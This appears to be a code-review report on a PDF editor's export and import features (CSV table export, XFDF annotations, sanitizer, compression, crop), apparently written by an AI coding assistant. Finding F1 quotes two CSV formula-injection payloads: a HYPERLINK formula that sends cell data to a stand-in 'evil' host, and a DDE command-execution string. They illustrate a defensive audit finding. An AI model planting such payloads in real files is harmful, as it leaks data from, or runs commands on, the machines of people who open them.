# QA Review — Codecs & Panels domain (2026-06-23)

Domain: XFDF import/export, Table→CSV, PDF sanitizer, Compress, Crop, Bates, Watermark.

Files read:
- `src/utils/xfdf.ts`, `src/utils/tableExtract.ts`, `src/utils/pdfSanitizer.ts`
- `src/export/compress.ts`, `src/export/batesStamp.ts`, `src/export/xfdfMapping.ts`
- `src/export/exportService.ts` (sanitize/compress/xfdf/csv methods)
- `src/ui/batesPanel.ts`, `src/ui/watermarkPanel.ts`, `src/ui/compressPanel.ts`
- `src/core/pageService.ts` (cropPage), `src/core/commands/pageCmds.ts` (SetPageCropCmd)
- `src/core/pdfTurboApp.ts` (importXfdf), `src/elements/{highlight,text,shape,comment}Element.ts`
- `src/ui/binders/keyboardBinder.ts`, `index.html` (modal inputs), `locales/{en,fr,ar}.json`

Overall: this domain is in good shape. The big-ticket correctness concerns the prompt
flagged are all genuinely handled correctly in the code:
- **Sanitizer** loads with `PDFDocument.load(input, { updateMetadata: false })`
  (pdfSanitizer.ts:88) and `compressLossless` does the same (compress.ts:94, exportService.ts:354).
- **Compress lossy** orientation is correct — `getViewport({scale})` honours rotation for
  the raster and `getViewport({scale:1})` gives the rotation-aware point box for the output
  page (exportService.ts:382-393).
- **Crop** is stored in unrotated content space, mapped via the shared `redactionRectToContent`
  + `clampContentRect` (pageService.ts:155), undoable via `SetPageCropCmd` (clean prev/restore).
- **XFDF coordinate flip** (`elementToXfdfAnnot`/`xfdfAnnotToElement`) is symmetric and correct.
- All three panels (Bates/Watermark/Compress) have Esc-to-close branches
  (keyboardBinder.ts:25-27) and `trapFocus` focus traps.
- XFDF XML is escaped (`escAttr`/`escText`); imported `color` flows only into CSS sinks
  (`style.color`, `Object.assign(div.style,…)`) — no innerHTML, so no XSS.
- Locale key parity (en/fr/ar) confirmed for every toast key in this domain.

Genuine findings below.

---

## F1 — CSV formula injection: table cells from an untrusted PDF are not neutralized (P2, security)

`src/utils/tableExtract.ts:100-107`

```ts
function csvField(value: string): string {
  return /[",\r\n]/.test(value) ? `"${value.replace(/"/g, '""')}"` : value;
}
export function gridToCsv(grid: TableGrid): string {
  return grid.cells.map(row => row.map(csvField).join(',')).join('\n');
}
```

The cell text originates from an arbitrary opened PDF (`_extractPageTableData` → source-PDF
text items, exportService.ts:442-468) and is written verbatim. `csvField` applies only
RFC-4180 quoting (comma / quote / newline). It does **not** neutralize the CSV/formula-injection
prefixes `=`, `+`, `-`, `@`, and the tab/CR lead-ins. A crafted PDF whose table cell reads e.g.
`=HYPERLINK("http://evil/?"&A1)` or `=cmd|'/c calc'!A1` becomes a live formula when the
downloaded `.csv` is opened in Excel / Google Sheets / LibreOffice Calc. PDFturbo's whole
threat model is "open a PDF you were sent" — the source is exactly the untrusted input.

This is not a documented ceiling (the #56 notes only mention lattice-only detection and the
XLSX deferral). It is a real, undocumented gap.

Recommendation: in `csvField`, when the value's first character is one of `= + - @ \t \r`,
prefix it with a single quote (`'`) or a tab, and force-quote it. Keep the RFC-4180 quoting
as-is. (The same guard should be applied to any future XLSX export #56b.)

---

## F2 — CSV download has no UTF-8 BOM → non-ASCII table text mojibakes in Excel (P3, ux/i18n)

`src/export/exportService.ts:459`

```ts
const blob = new Blob([gridToCsv(grid)], { type: 'text/csv;charset=utf-8' });
```

The blob is declared `charset=utf-8`, but Microsoft Excel ignores the MIME charset on a
`.csv` double-click and decodes as the system ANSI codepage unless a UTF-8 BOM (`﻿`) is
present. A table containing French accents / Arabic / any non-ASCII (likely, given the
multi-language scope) will render as mojibake for the most common consumer of CSV. Other
text exports here (markdown/txt) are less codepage-sensitive but share the pattern.

Recommendation: prepend `'﻿'` to the CSV string (or the blob parts) for the `.csv`
download. Low risk, large fidelity win.

---

## F3 — XFDF import does not normalize inverted / negative-size rects (P3, bug/robustness)

`src/export/xfdfMapping.ts:77-92`

```ts
const [x1, y1, x2, y2] = a.rect;
const x = x1, w = x2 - x1, h = y2 - y1, y = pageHeight - y2;
...
return new TextElement(x, y, pageId, { width: w, height: h, ... });
```

`parseXfdf` accepts any 4 finite numbers as `rect` without ordering them (xfdf.ts:148-156).
A foreign XFDF (Acrobat allows `rect` corners in any order) or a malformed file can yield
`x2 < x1` or `y2 < y1`, producing a negative `w`/`h` on the constructed element. Highlights,
freetext and comments get a negative-size box (invisible / mis-rendered / unselectable);
square/circle the same. The line/ink branches are safe (they normalize via `Math.min`/`abs`),
which makes the rect branches the inconsistent outlier.

Recommendation: normalize in `xfdfAnnotToElement` (or once in `parseXfdf`):
`const x = Math.min(x1,x2), w = Math.abs(x2-x1), …` and flip the y accordingly. Matches what
the line/ink branches already do.

---

## F4 — XFDF export/import ignore per-page rotation and crop in the y-flip (P3, fidelity — partially documented)

`src/export/exportService.ts:421` and `src/core/pdfTurboApp.ts:934` both flip using
`pageHeightPt(...)`, which returns the **unrotated source viewport height** (xfdfMapping.ts:124-133,
`getViewport({ scale: 1 })` with no rotation arg) and ignores `page.crop`.

For a rotated or cropped page the element display coordinates are in the rotated/cropped
display space, but the flip assumes unrotated full-page space, so exported XFDF rects land
in the wrong place (and a round-trip back into PDFturbo will be off for rotated pages).
The CLAUDE.md #57b ceiling explicitly lists "rotated-page coordinate transform" as a known
limitation, so the **rotation** half is documented. The **crop** interaction (page.crop,
shipped later as #G23) is *not* mentioned in the #57b ceiling list and is an undocumented
gap — worth a one-line note in the ceiling.

Recommendation: no code change required for the rotation case (documented ceiling); add
`crop` to the #57b ceiling note, or guard the export to skip/annotate rotated+cropped pages.

---

## F5 — Lossy compress silently discards links, form fields and selectable text without an explicit confirm (P3, ux/data-safety — documented trade-off)

`src/export/exportService.ts:367-402` rebuilds an image-only PDF; the modal hint
(`modal.compress.hintLossy`) and the CLAUDE.md #60 notes both call out that selectable text
is dropped. However the lossy path *also* drops hyperlink annotations, AcroForm fields and
any vector content — not just text — and the only signal is the generic "flatten to images"
hint. Since this is a one-shot destructive transform of the *exported* copy (the in-memory
doc is untouched, so no true data loss), this is low severity, but the hint understates the
loss ("drops selectable text" vs "rasterizes the page — links and form fields are lost too").

Recommendation: broaden the lossy hint wording in all three locales to "flattens pages to
images — selectable text, links and form fields are lost." No logic change.

---

## Non-findings verified clean

- **Sanitizer updateMetadata:false** — present and correct (pdfSanitizer.ts:88, compress.ts:94).
  Annotation /A JS-action stripping correctly preserves /URI and /GoTo (stripNodeActions,
  pdfSanitizer.ts:118-125). Field walk is cycle-guarded with a `seen` set (line 176).
- **SetPageCropCmd** — captures `prevCrop`, restores exactly incl. "no crop" (`delete page.crop`),
  guarded by `_captured`. Apply-to-all builds a MacroCmd; current-page command carries the
  re-render. Undo is intact.
- **Bates `intOr`** preserves a typed `0` (batesPanel.ts:18-21, the documented NaN-safe idiom);
  clamps applied in `apply()`.
- **Watermark inputs** are all `type=range` (index.html:340-352) so the `parseInt(...) || x`
  fallbacks can never see a blank/NaN — no defect.
- **Compress clamps** (`clampDpi`/`clampQuality`) map NaN→default, not floor (compress.ts:44-51).
- **XSS via imported color** — color reaches only `style.color` / `Object.assign(div.style)`
  CSS sinks (highlightElement.ts:24, textElement.ts:88), never innerHTML; modern browsers
  reject invalid CSS, no `expression()`/`url()` execution. Not exploitable.
- **i18n parity** — every toast key in this domain present in en/fr/ar (Arabic values flagged
  [Unverified] for native review per project convention, not a defect).
